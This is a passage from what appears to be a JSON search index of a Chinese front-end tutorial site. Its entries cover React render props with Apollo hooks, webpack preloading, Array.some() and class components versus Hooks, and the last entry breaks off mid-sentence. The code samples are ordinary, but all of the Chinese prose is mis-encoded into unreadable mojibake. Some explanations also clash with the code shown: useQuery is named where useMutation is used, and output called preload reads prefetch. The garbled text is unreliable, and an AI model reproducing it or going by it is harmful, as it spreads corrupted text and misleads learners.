å‘å¸ƒåï¼ŒApollo ä¸º Apollo Client åº“æ·»åŠ äº† Hooks æ”¯æŒã€‚ å¼€å‘äººå‘˜ç°åœ¨å¯ä»¥é€šè¿‡åº“æä¾›çš„é’©å­ç›´æ¥è®¿é—®æ•°æ®ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ Mutation å’Œ Query æ¸²æŸ“é“å…·ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼Œè¯¥ç¤ºä¾‹ä½¿ç”¨ä¸æˆ‘ä»¬ä¹‹å‰åœ¨å¸¦æœ‰ Query æ¸²æŸ“é“å…·çš„ç¤ºä¾‹ä¸­çœ‹åˆ°çš„å®Œå…¨ç›¸åŒçš„æ•°æ®ã€‚ è¿™ä¸€æ¬¡ï¼Œä½¿ç”¨ Apollo Client ä¸ºæˆ‘ä»¬æä¾›çš„ useQuery é’©å­å‘ç»„ä»¶æä¾›æ•°æ®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import InputHOC from \u0026#34;./InputHOC\u0026#34;; import InputHooks from \u0026#34;./InputHooks\u0026#34;; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;HOC\u0026lt;/h3\u0026gt; \u0026lt;InputHOC /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Hooks\u0026lt;/h3\u0026gt; \u0026lt;InputHooks /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11  //resolvers.js import { gql } from \u0026#34;apollo-boost\u0026#34;; export const ADD_MESSAGE = gql` mutation AddMessage($message: String!) { addMessage(message: $message) { message } } `;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  //InputHOC.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { graphql } from \u0026#34;react-apollo\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; class Input extends React.Component { constructor() { super(); this.state = { message: \u0026#34;\u0026#34; }; } handleChange = (e) =\u0026gt; { this.setState({ message: e.target.value }); }; handleClick = () =\u0026gt; { this.props.mutate({ variables: { message: this.state.message } }); }; render() { return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={this.handleChange} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={this.handleClick}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); } } export default graphql(ADD_MESSAGE)(Input);   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //InputHooks.js import React, { useState } from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { useMutation } from \u0026#34;@apollo/react-hooks\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default function Input() { const [message, setMessage] = useState(\u0026#34;\u0026#34;); const [addMessage] = useMutation(ADD_MESSAGE, { variables: { message } }); return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={(e) =\u0026gt; setMessage(e.target.value)} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }   é€šè¿‡ä½¿ç”¨ useQuery é’©å­ï¼Œæˆ‘ä»¬å‡å°‘äº†ä¸ºç»„ä»¶æä¾›æ•°æ®æ‰€éœ€çš„ä»£ç é‡ã€‚\n\rä¼˜ç‚¹ ä½¿ç”¨æ¸²æŸ“é“å…·æ¨¡å¼å¯ä»¥è½»æ¾åœ°åœ¨å¤šä¸ªç»„ä»¶ä¹‹é—´å…±äº«é€»è¾‘å’Œæ•°æ®ã€‚é€šè¿‡ä½¿ç”¨ render æˆ– children é“å…·ï¼Œç»„ä»¶å¯ä»¥å˜å¾—éå¸¸å¯é‡ç”¨ã€‚\nè™½ç„¶é«˜é˜¶ç»„ä»¶æ¨¡å¼ä¸»è¦è§£å†³ç›¸åŒçš„é—®é¢˜ï¼Œå³å¯é‡ç”¨æ€§å’Œå…±äº«æ•°æ®ï¼Œä½†æ¸²æŸ“é“å…·æ¨¡å¼è§£å†³äº†æˆ‘ä»¬ä½¿ç”¨ HOC æ¨¡å¼å¯èƒ½é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚\nä½¿ç”¨ HOC æ¨¡å¼å¯èƒ½é‡åˆ°çš„å‘½åå†²çªé—®é¢˜ä¸å†é€‚ç”¨äºä½¿ç”¨æ¸²æŸ“é“å…·æ¨¡å¼ï¼Œå› ä¸ºæˆ‘ä»¬ä¸ä¼šè‡ªåŠ¨åˆå¹¶é“å…·ã€‚\næˆ‘ä»¬ä½¿ç”¨çˆ¶ç»„ä»¶æä¾›çš„å€¼æ˜¾å¼åœ°å°† props ä¼ é€’ç»™å­ç»„ä»¶ã€‚\nç”±äºæˆ‘ä»¬æ˜¾å¼ä¼ é€’ propsï¼Œæˆ‘ä»¬è§£å†³äº† HOC çš„éšå¼ props é—®é¢˜ã€‚åº”è¯¥ä¼ é€’ç»™å…ƒç´ çš„é“å…·åœ¨æ¸²æŸ“é“å…·çš„å‚æ•°åˆ—è¡¨ä¸­éƒ½æ˜¯å¯è§çš„ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬ç¡®åˆ‡åœ°çŸ¥é“æŸäº›é“å…·æ¥è‡ªå“ªé‡Œã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡æ¸²æŸ“é“å…·å°†åº”ç”¨ç¨‹åºçš„é€»è¾‘ä¸æ¸²æŸ“ç»„ä»¶åˆ†å¼€ã€‚æ¥æ”¶æ¸²æŸ“é“å…·çš„æœ‰çŠ¶æ€ç»„ä»¶å¯ä»¥å°†æ•°æ®ä¼ é€’ç»™æ— çŠ¶æ€ç»„ä»¶ï¼Œæ— çŠ¶æ€ç»„ä»¶ä»…æ¸²æŸ“æ•°æ®ã€‚\n\rç¼ºç‚¹ æˆ‘ä»¬è¯•å›¾ç”¨æ¸²æŸ“é“å…·è§£å†³çš„é—®é¢˜åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå·²è¢« React Hooks å–ä»£ã€‚ éšç€ Hooks æ”¹å˜äº†æˆ‘ä»¬ä¸ºç»„ä»¶æ·»åŠ å¯é‡ç”¨æ€§å’Œæ•°æ®å…±äº«çš„æ–¹å¼ï¼Œå®ƒä»¬å¯ä»¥åœ¨è®¸å¤šæƒ…å†µä¸‹å–ä»£æ¸²æŸ“é“å…·æ¨¡å¼ã€‚\nç”±äºæˆ‘ä»¬æ— æ³•å‘ render prop æ·»åŠ ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½åœ¨ä¸éœ€è¦æ›´æ”¹å®ƒä»¬æ¥æ”¶åˆ°çš„æ•°æ®çš„ç»„ä»¶ä¸Šä½¿ç”¨å®ƒã€‚\n\rçŸ¥è¯†ç‚¹  render props children  ","description":"é€šè¿‡ props é“å…·å°† JSX å…ƒç´ ä¼ é€’ç»™ç»„ä»¶ï¼ˆè¿™æ˜¯å†å²é—ç•™é—®é¢˜ï¼Œæ‰€ä»¥ä¸å¤ªå»ºè®®ä½¿ç”¨äº†ï¼Œå› ä¸ºæœ‰äº†Hooksï¼Œåœ¨è¿™é‡Œåªæ˜¯è®©æˆ‘ä»¬äº†è§£è¿™æ®µå†å²ï¼‰","id":120,"section":"react-patterns","tags":null,"title":"render é“å…·æ¨¡å¼ï¼ˆXï¼‰","uri":"https://codthing.github.io/react-patterns/design-patterns/render-props-pattern/"},{"content":"é¢„åŠ è½½ (\u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;) æ˜¯ä¸€ç§æµè§ˆå™¨ä¼˜åŒ–ï¼Œå…è®¸æ›´æ—©åœ°è¯·æ±‚å…³é”®èµ„æºï¼ˆå¯èƒ½å‘ç°è¾ƒæ™šï¼‰ã€‚ å¦‚æœæ‚¨å¯¹å¦‚ä½•æ‰‹åŠ¨æ’åºå…³é”®èµ„æºçš„åŠ è½½æ„Ÿåˆ°æ»¡æ„ï¼Œå®ƒä¼šå¯¹ Core Web Vitals ä¸­çš„åŠ è½½æ€§èƒ½å’ŒæŒ‡æ ‡äº§ç”Ÿç§¯æå½±å“ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œé¢„åŠ è½½ä¸æ˜¯çµä¸¹å¦™è¯ï¼Œéœ€è¦äº†è§£ä¸€äº›æƒè¡¡ã€‚\nåœ¨ä¼˜åŒ–äº¤äº’æ—¶é—´æˆ–é¦–æ¬¡è¾“å…¥å»¶è¿Ÿç­‰æŒ‡æ ‡æ—¶ï¼Œé¢„åŠ è½½å¯ç”¨äºåŠ è½½äº¤äº’æ‰€éœ€çš„ JavaScript åŒ…ï¼ˆæˆ–å—ï¼‰ã€‚ è¯·è®°ä½ï¼Œåœ¨ä½¿ç”¨é¢„åŠ è½½æ—¶éœ€è¦éå¸¸å°å¿ƒï¼Œé¿å…ä»¥å»¶è¿Ÿé¦–æ¬¡å†…å®¹ç»˜åˆ¶æˆ–æœ€å¤§å†…å®¹ç»˜åˆ¶æ‰€éœ€çš„èµ„æºï¼ˆå¦‚è‹±é›„å›¾åƒæˆ–å­—ä½“ï¼‰ä¸ºä»£ä»·æ¥æé«˜äº¤äº’æ€§ã€‚\nå¦‚æœå°è¯•ä¼˜åŒ–ç¬¬ä¸€å— JavaScript çš„åŠ è½½ï¼Œè¿˜å¯ä»¥è€ƒè™‘åœ¨æ–‡æ¡£ \u0026lt;head\u0026gt; vs. \u0026lt;body\u0026gt; ä¸­ä½¿ç”¨ \u0026lt;script defer\u0026gt; æ¥å¸®åŠ©åŠæ—©å‘ç°è¿™äº›èµ„æºã€‚\n\r\råœ¨å•é¡µåº”ç”¨ç¨‹åºä¸­é¢„åŠ è½½ è™½ç„¶é¢„å–æ˜¯ç¼“å­˜å¯èƒ½å¾ˆå¿«ä¼šè¢«è¯·æ±‚çš„èµ„æºçš„å¥½æ–¹æ³•ï¼Œä½†å¯ä»¥é¢„åŠ è½½éœ€è¦ç«‹å³ä½¿ç”¨çš„èµ„æºã€‚ ä¹Ÿè®¸å®ƒæ˜¯åœ¨åˆå§‹æ¸²æŸ“ä¸­ä½¿ç”¨çš„æŸç§å­—ä½“ï¼Œæˆ–è€…ç”¨æˆ·ç«‹å³çœ‹åˆ°çš„æŸäº›å›¾åƒã€‚\nå‡è®¾æˆ‘ä»¬çš„ EmojiPicker ç»„ä»¶åº”è¯¥åœ¨åˆå§‹æ¸²æŸ“æ—¶ç«‹å³å¯è§ã€‚ è™½ç„¶å®ƒä¸åº”è¯¥åŒ…å«åœ¨ä¸»åŒ…ä¸­ï¼Œä½†å®ƒåº”è¯¥å¹¶è¡ŒåŠ è½½ã€‚ å°±åƒ prefetch ä¸€æ ·ï¼Œå¯ä»¥æ·»åŠ ä¸€ä¸ªç¥å¥‡çš„æ³¨é‡Šï¼Œè®© Webpack çŸ¥é“åº”è¯¥é¢„åŠ è½½è¿™ä¸ªæ¨¡å—ã€‚\n1 2  const EmojiPicker = import(/* webpackPreload: true */ \u0026#34;./EmojiPicker\u0026#34;);   const path = require(\u0026#34;path\u0026#34;);\rconst HTMLWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;);\rconst PreloadWebpackPlugin = require(\u0026#34;preload-webpack-plugin\u0026#34;);\rmodule.exports = {\rentry: {\rmain: \u0026#34;./src/index.js\u0026#34;,\remojiPicker: \u0026#34;./src/components/EmojiPicker.js\u0026#34;\r},\rmodule: {\rrules: [\r{\rtest: /\\.(js|jsx)$/,\rexclude: /node_modules/,\ruse: [\u0026#34;babel-loader\u0026#34;]\r},\r{\rtest: /\\.css$/i,\ruse: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;]\r}\r]\r},\rresolve: {\rextensions: [\u0026#34;*\u0026#34;, \u0026#34;.js\u0026#34;, \u0026#34;.jsx\u0026#34;]\r},\rmode: \u0026#34;development\u0026#34;,\routput: {\rpath: path.resolve(__dirname, \u0026#34;dist\u0026#34;),\rfilename: \u0026#34;[name].bundle.js\u0026#34;\r},\rplugins: [\rnew HTMLWebpackPlugin({\rtemplate: path.resolve(__dirname, \u0026#34;dist\u0026#34;, \u0026#34;index.html\u0026#34;)\r}),\rnew PreloadWebpackPlugin({\rrel: \u0026#34;preload\u0026#34;,\ras: \u0026#34;script\u0026#34;,\rinclude: [\u0026#34;emojiPicker\u0026#34;]\r})\r],\rdevServer: {\rcontentBase: path.join(__dirname, \u0026#34;dist\u0026#34;),\rcompress: true,\rport: 9000\r}\r}; Webpack 4.6.0+ å…è®¸é€šè¿‡åœ¨å¯¼å…¥ä¸­æ·»åŠ  /* webpackPreload: true */ æ¥é¢„åŠ è½½èµ„æºã€‚ ä¸ºäº†åœ¨æ—§ç‰ˆæœ¬çš„ webpack ä¸­è¿›è¡Œé¢„åŠ è½½ï¼Œéœ€è¦å°† preload-webpack-plugin æ·»åŠ åˆ°æ‚¨çš„ webpack é…ç½®ä¸­ã€‚\næ„å»ºåº”ç”¨ç¨‹åºåï¼Œå¯ä»¥çœ‹åˆ° EmojiPicker å°†è¢«é¢„å–ã€‚\nAsset Size Chunks Chunk Names\remoji-picker.bundle.js 1.49 KiB emoji-picker [emitted] emoji-picker\rvendors~emoji-picker.bundle.js 171 KiB vendors~emoji-picker [emitted] vendors~emoji-picker\rmain.bundle.js 1.34 MiB main [emitted] main\rEntrypoint main = main.bundle.js\r(preload: vendors~emoji-picker.bundle.js emoji-picker.bundle.js) å®é™…è¾“å‡ºä½œä¸ºé“¾æ¥æ ‡ç­¾å¯è§ï¼Œåœ¨æ–‡æ¡£å¤´éƒ¨å¸¦æœ‰ rel=\u0026quot;preload\u0026quot;ã€‚\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt;\r\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;vendors~emoji-picker.bundle.js\u0026#34; as=\u0026#34;script\u0026#34; /\u0026gt; é¢„åŠ è½½çš„ EmojiPicker å¯ä»¥ä¸åˆå§‹åŒ…å¹¶è¡ŒåŠ è½½ã€‚ ä¸é¢„å–ä¸åŒçš„æ˜¯ï¼Œæµè§ˆå™¨åœ¨æ˜¯å¦è®¤ä¸ºå®ƒæœ‰è¶³å¤Ÿå¥½çš„äº’è”ç½‘è¿æ¥å’Œå¸¦å®½æ¥å®é™…é¢„å–èµ„æºæ–¹é¢ä»ç„¶æœ‰å‘è¨€æƒï¼Œé¢„åŠ è½½çš„èµ„æºæ— è®ºå¦‚ä½•éƒ½ä¼šè¢«é¢„åŠ è½½ã€‚\næ— éœ€ç­‰å¾… EmojiPicker åœ¨åˆå§‹æ¸²æŸ“ååŠ è½½ï¼Œèµ„æºå°†ç«‹å³å¯ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼ ç”±äºæˆ‘ä»¬æ­£åœ¨ä»¥æ›´æ™ºèƒ½çš„é¡ºåºåŠ è½½èµ„äº§ï¼Œåˆå§‹åŠ è½½æ—¶é—´å¯èƒ½ä¼šæ˜¾ç€å¢åŠ ï¼Œå…·ä½“å–å†³äºæ‚¨çš„ç”¨æˆ·è®¾å¤‡å’Œäº’è”ç½‘è¿æ¥ã€‚ ä»…åœ¨åˆå§‹æ¸²æŸ“åçº¦ 1 ç§’é¢„åŠ è½½å¿…é¡»å¯è§çš„èµ„æºã€‚\n\ré¢„åŠ è½½ + å¼‚æ­¥ hack å¦‚æœå¸Œæœ›æµè§ˆå™¨ä»¥é«˜ä¼˜å…ˆçº§ä¸‹è½½è„šæœ¬ï¼Œä½†ä¸é˜»æ­¢è§£æå™¨ç­‰å¾…è„šæœ¬ï¼Œå¯ä»¥åˆ©ç”¨ä¸‹é¢çš„ preload + async hackã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¢„åŠ è½½å¯èƒ½ä¼šå»¶è¿Ÿå…¶ä»–èµ„æºçš„ä¸‹è½½ï¼Œä½†è¿™æ˜¯å¼€å‘äººå‘˜å¿…é¡»åšå‡ºçš„æƒè¡¡ï¼š\n\u0026lt;link rel=\u0026#34;preload\u0026#34; href=\u0026#34;emoji-picker.js\u0026#34; as=\u0026#34;script\u0026#34;\u0026gt;\r\u0026lt;script src=\u0026#34;emoji-picker.js\u0026#34; async\u0026gt; åœ¨ Chrome 95+ ä¸­é¢„åŠ è½½ ç”±äºå¯¹ Chrome 95+ ä¸­é¢„åŠ è½½é˜Ÿåˆ—è·³è½¬è¡Œä¸ºçš„ä¸€äº›ä¿®å¤ï¼Œè¯¥åŠŸèƒ½åœ¨æ›´å¹¿æ³›åœ°ä½¿ç”¨æ—¶ç¨å¾®å®‰å…¨ä¸€äº›ã€‚ Chrome å¯¹é¢„åŠ è½½çš„æ–°å»ºè®®çš„ Pat Meenan å»ºè®®ï¼š\n  å°†å®ƒæ”¾åœ¨ HTTP æ ‡å¤´ä¸­å°†é¢†å…ˆäºå…¶ä»–æ‰€æœ‰å†…å®¹\né€šå¸¸ï¼Œé¢„åŠ è½½å°†æŒ‰ç…§è§£æå™¨å¯¹ \u0026gt;= ä¸­çš„ä»»ä½•å†…å®¹çš„é¡ºåºåŠ è½½ï¼Œå› æ­¤è¯·å°å¿ƒå°†é¢„åŠ è½½æ”¾åœ¨ HTML çš„å¼€å¤´ã€‚\n  å­—ä½“é¢„åŠ è½½å¯èƒ½æœ€å¥½åœ¨å¤´éƒ¨çš„æœ«å°¾æˆ–æ­£æ–‡çš„å¼€å¤´\n  å¯¼å…¥é¢„åŠ è½½åº”è¯¥åœ¨éœ€è¦å¯¼å…¥çš„è„šæœ¬æ ‡ç­¾ä¹‹åå®Œæˆï¼ˆå› æ­¤é¦–å…ˆåŠ è½½/è§£æå®é™…è„šæœ¬ï¼‰\n  å›¾åƒé¢„åŠ è½½å°†å…·æœ‰ä½ä¼˜å…ˆçº§ï¼Œåº”ç›¸å¯¹äºå¼‚æ­¥è„šæœ¬å’Œå…¶ä»–ä½/æœ€ä½ä¼˜å…ˆçº§æ ‡ç­¾è¿›è¡Œæ’åº\n  \rç»“è®º åŒæ ·ï¼Œè¯·è°¨æ…ä½¿ç”¨é¢„åŠ è½½å¹¶å§‹ç»ˆè¡¡é‡å…¶å¯¹ç”Ÿäº§çš„å½±å“ã€‚\nå¦‚æœå›¾åƒçš„é¢„åŠ è½½åœ¨æ–‡æ¡£ä¸­æ¯”å®ƒæ›´æ—©ï¼Œè¿™å¯ä»¥å¸®åŠ©æµè§ˆå™¨å‘ç°å®ƒï¼ˆä»¥åŠç›¸å¯¹äºå…¶ä»–èµ„æºçš„é¡ºåºï¼‰ã€‚\nå¦‚æœä½¿ç”¨ä¸å½“ï¼Œé¢„åŠ è½½ä¼šå¯¼è‡´å›¾åƒå»¶è¿Ÿé¦–æ¬¡å†…å®¹ç»˜åˆ¶ï¼ˆä¾‹å¦‚ CSSã€å­—ä½“ï¼‰â€”â€” ä¸æ‚¨æƒ³è¦çš„ç›¸åã€‚\nå¦è¯·æ³¨æ„ï¼Œè¦ä½¿æ­¤ç±»é‡æ–°ç¡®å®šä¼˜å…ˆçº§å·¥ä½œæœ‰æ•ˆï¼Œè¿˜å–å†³äºæœåŠ¡å™¨æ­£ç¡®ç¡®å®šè¯·æ±‚çš„ä¼˜å…ˆçº§ã€‚\næ‚¨å¯èƒ½è¿˜ä¼šå‘ç° \u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt; åœ¨éœ€è¦è·å–è„šæœ¬è€Œä¸æ‰§è¡Œå®ƒä»¬çš„æƒ…å†µä¸‹å¾ˆæœ‰å¸®åŠ©ã€‚\n\rçŸ¥è¯†ç‚¹   webpack\n  \u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;\n  ","description":"åœ¨å‘ç°å…³é”®èµ„æºä¹‹å‰é€šçŸ¥æµè§ˆå™¨","id":121,"section":"react-patterns","tags":null,"title":"é¢„åŠ è½½","uri":"https://codthing.github.io/react-patterns/performance-patterns/preload/"},{"content":"some() æ–¹æ³•æµ‹è¯•æ•°ç»„ä¸­æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ é€šè¿‡äº†æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•ã€‚ å¦‚æœåœ¨æ•°ç»„ä¸­æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ ï¼Œæä¾›çš„å‡½æ•°ä¸ºå…¶è¿”å›çœŸå€¼ï¼Œåˆ™è¿”å›çœŸå€¼ï¼› å¦åˆ™è¿”å›falseã€‚ å®ƒä¸ä¼šä¿®æ”¹æ•°ç»„ã€‚\n\rä½¿ç”¨ some æ–¹æ³•æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦æœ‰å…ƒç´ æ˜¯å¦ç¬¦åˆæ¡ä»¶ some æ–¹æ³•ç”¨äºæ£€æµ‹æ•°ç»„ä¸­ä»»ä½•å…ƒç´ æ˜¯å¦æ»¡è¶³æŒ‡å®šæ¡ä»¶ã€‚\nå¦‚æœæœ‰ä¸€ä¸ªå…ƒç´ æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›å¸ƒå°”å€¼ trueï¼Œåä¹‹è¿”å› falseã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢çš„ä»£ç æ£€æµ‹æ•°ç»„numbersä¸­æ˜¯å¦æœ‰å…ƒç´ å°äº 10ï¼š\n1 2 3 4 5 6 7 8  const numbers = [10, 50, 8, 220, 110, 11]; numbers.some(function(currentValue) { return currentValue \u0026lt; 10; }); // true   åœ¨ checkPositive å‡½æ•°å€¼ä¸­ä½¿ç”¨ some æ£€æŸ¥ arr ä¸­æ˜¯å¦æœ‰å…ƒç´ ä¸ºæ­£æ•°ã€‚ å‡½æ•°åº”è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ã€‚\n1 2 3 4 5 6 7 8  function checkPositive(arr) { return arr.some(elem =\u0026gt; elem \u0026gt; 0); } checkPositive([1, 2, 3, -4, 5]); // true   ","description":"some() æ–¹æ³•æµ‹è¯•æ•°ç»„ä¸­æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ é€šè¿‡äº†æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•ã€‚ å¦‚æœåœ¨æ•°ç»„ä¸­æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ ï¼Œæä¾›çš„å‡½æ•°ä¸ºå…¶è¿”å›çœŸå€¼ï¼Œåˆ™è¿”å›çœŸå€¼ï¼› å¦åˆ™è¿”å›falseã€‚ å®ƒä¸ä¼šä¿®æ”¹æ•°ç»„ã€‚","id":122,"section":"javascript","tags":null,"title":"Array.prototype.some()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/some-programming/"},{"content":"React 16.8 å¼•å…¥äº†ä¸€ä¸ªåä¸º Hooks çš„æ–°åŠŸèƒ½ã€‚\nHooks ä½¿å¾—ä½¿ç”¨ React çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸæ–¹æ³•æˆä¸ºå¯èƒ½ï¼Œè€Œæ— éœ€ä½¿ç”¨ ES2015 ç±»ç»„ä»¶ã€‚\nå°½ç®¡ Hooks ä¸ä¸€å®šæ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œä½† Hooks åœ¨æ‚¨çš„åº”ç”¨ç¨‹åºè®¾è®¡ä¸­æ‰®æ¼”ç€éå¸¸é‡è¦çš„è§’è‰²ã€‚\nè®¸å¤šä¼ ç»Ÿçš„è®¾è®¡æ¨¡å¼å¯ä»¥è¢« Hooks å–ä»£ã€‚\n\rclass ç»„ä»¶ï¼ˆXï¼‰ åœ¨ React ä¸­å¼•å…¥ Hooks ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»ä½¿ç”¨ç±»ç»„ä»¶æ¥å‘ç»„ä»¶æ·»åŠ çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚ React ä¸­çš„å…¸å‹ç±»ç»„ä»¶å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class MyComponent extends React.Component { /* æ·»åŠ çŠ¶æ€å’Œç»‘å®šè‡ªå®šä¹‰æ–¹æ³• */ constructor() { super() this.state = { ... } this.customMethodOne = this.customMethodOne.bind(this) this.customMethodTwo = this.customMethodTwo.bind(this) } /* ç”Ÿå‘½å‘¨æœŸæ–¹æ³• */ componentDidMount() { ...} componentWillUnmount() { ... } /* è‡ªå®šä¹‰æ–¹æ³• */ customMethodOne() { ... } customMethodTwo() { ... } render() { return { ... }} }   ç±»ç»„ä»¶å¯ä»¥åœ¨å…¶æ„é€ å‡½æ•°ä¸­åŒ…å«çŠ¶æ€ã€ç”Ÿå‘½å‘¨æœŸæ–¹æ³•\nï¼ˆä¾‹å¦‚ componentDidMount å’Œ componentWillUnmount ä»¥æ ¹æ®ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œå‰¯ä½œç”¨ï¼‰ä»¥åŠè‡ªå®šä¹‰æ–¹æ³•ä»¥å‘ç±»æ·»åŠ é¢å¤–é€»è¾‘ã€‚\nclass ç»„ä»¶çš„ç¼ºç‚¹ å°½ç®¡å¼•å…¥ React Hooks åæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ç±»ç»„ä»¶ï¼Œä½†ä½¿ç”¨ç±»ç»„ä»¶å¯èƒ½ä¼šæœ‰ä¸€äº›ç¼ºç‚¹ï¼ è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä½¿ç”¨ç±»ç»„ä»¶æ—¶æœ€å¸¸è§çš„ä¸€äº›é—®é¢˜ã€‚\näº†è§£ ES2015 ç±» ç”±äºåœ¨ React Hooks ä¹‹å‰ï¼Œç±»ç»„ä»¶æ˜¯å”¯ä¸€å¯ä»¥å¤„ç†çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸæ–¹æ³•çš„ç»„ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ç»å¸¸ä¸å¾—ä¸å°†åŠŸèƒ½ç»„ä»¶é‡æ„ä¸ºç±»ç»„ä»¶ï¼Œä»¥æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚\nåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæœ‰ä¸€ä¸ªç”¨ä½œæŒ‰é’®çš„ç®€å• divã€‚\nfunction Button() {\rreturn \u0026lt;div className=\u0026#34;btn\u0026#34;\u0026gt;disabled\u0026lt;/div\u0026gt;;\r} æˆ‘ä»¬å¸Œæœ›åœ¨ç”¨æˆ·å•å‡»æŒ‰é’®æ—¶å°†å…¶æ›´æ”¹ä¸ºå¯ç”¨ï¼Œè€Œä¸æ˜¯å§‹ç»ˆæ˜¾ç¤ºç¦ç”¨ï¼Œå¹¶åœ¨å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ä¸ºæŒ‰é’®æ·»åŠ ä¸€äº›é¢å¤–çš„ CSS æ ·å¼ã€‚\nä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦å‘ç»„ä»¶æ·»åŠ çŠ¶æ€ï¼Œä»¥ä¾¿çŸ¥é“çŠ¶æ€æ˜¯å¯ç”¨è¿˜æ˜¯ç¦ç”¨ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»å®Œå…¨é‡æ„åŠŸèƒ½ç»„ä»¶ï¼Œå¹¶ä½¿å…¶æˆä¸ºè·Ÿè¸ªæŒ‰é’®çŠ¶æ€çš„ç±»ç»„ä»¶ã€‚\nexport default class Button extends React.Component {\rconstructor() {\rsuper();\rthis.state = { enabled: false };\r}\rrender() {\rconst { enabled } = this.state;\rconst btnText = enabled ? \u0026#34;enabled\u0026#34; : \u0026#34;disabled\u0026#34;;\rreturn (\r\u0026lt;div\rclassName={`btn enabled-${enabled}`}\ronClick={() =\u0026gt; this.setState({ enabled: !enabled })}\r\u0026gt;\r{btnText}\r\u0026lt;/div\u0026gt;\r);\r}\r} æœ€åï¼ŒæŒ‰é’®æŒ‰æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼å·¥ä½œï¼\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç»„ä»¶éå¸¸å°ï¼Œé‡æ„å¹¶ä¸æ˜¯ä»€ä¹ˆå¤§äº‹ã€‚ ç„¶è€Œï¼Œç°å®ç”Ÿæ´»ä¸­çš„ç»„ä»¶å¯èƒ½åŒ…å«æ›´å¤šçš„ä»£ç è¡Œï¼Œè¿™ä½¿å¾—é‡æ„ç»„ä»¶å˜å¾—æ›´åŠ å›°éš¾ã€‚\né™¤äº†å¿…é¡»ç¡®ä¿åœ¨é‡æ„ç»„ä»¶æ—¶ä¸ä¼šæ„å¤–æ›´æ”¹ä»»ä½•è¡Œä¸ºï¼Œ\næ‚¨è¿˜éœ€è¦äº†è§£ ES2015 